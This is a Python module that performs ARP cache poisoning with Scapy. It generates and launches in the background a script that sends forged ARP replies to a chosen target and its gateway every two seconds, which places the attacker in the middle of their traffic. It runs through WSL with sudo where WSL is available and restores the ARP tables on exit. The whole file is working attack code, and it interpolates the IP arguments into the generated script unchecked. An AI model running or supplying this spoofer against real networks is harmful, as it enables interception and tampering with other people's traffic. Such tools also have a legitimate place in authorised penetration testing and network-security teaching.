"""
ARP cache poisoning / spoofing module using Scapy.
"""
import shutil
import subprocess
import sys


def _is_wsl_available() -> bool:
    return shutil.which("wsl") is not None


def arp_spoof(
    target_ip: str,
    gateway_ip: str,
    iface: str = "eth0",
    duration: int = 60,
) -> subprocess.Popen:
    """
    Launches ARP spoofing in background.
    Restores correct ARP tables on termination.
    """
    script = f"""
from scapy.all import *
import time, sys

target = '{target_ip}'
gateway = '{gateway_ip}'
duration = {duration}

print(f'[ARP Spoof] Poisoning target {{target}} and gateway {{gateway}}...')
end_time = time.time() + duration

try:
    target_mac = getmacbyip(target) or 'ff:ff:ff:ff:ff:ff'
    gateway_mac = getmacbyip(gateway) or 'ff:ff:ff:ff:ff:ff'

    while time.time() < end_time:
        send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=0)
        send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=0)
        time.sleep(2)
finally:
    print('[ARP Spoof] Restoring ARP tables...')
    target_mac = getmacbyip(target) or 'ff:ff:ff:ff:ff:ff'
    gateway_mac = getmacbyip(gateway) or 'ff:ff:ff:ff:ff:ff'
    send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=gateway_mac), count=3, verbose=0)
    send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target, hwsrc=target_mac), count=3, verbose=0)
"""

    if _is_wsl_available():
        cmd = ["wsl", "-e", "sudo", "python3", "-c", script]
    else:
        cmd = [sys.executable, "-c", script]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc

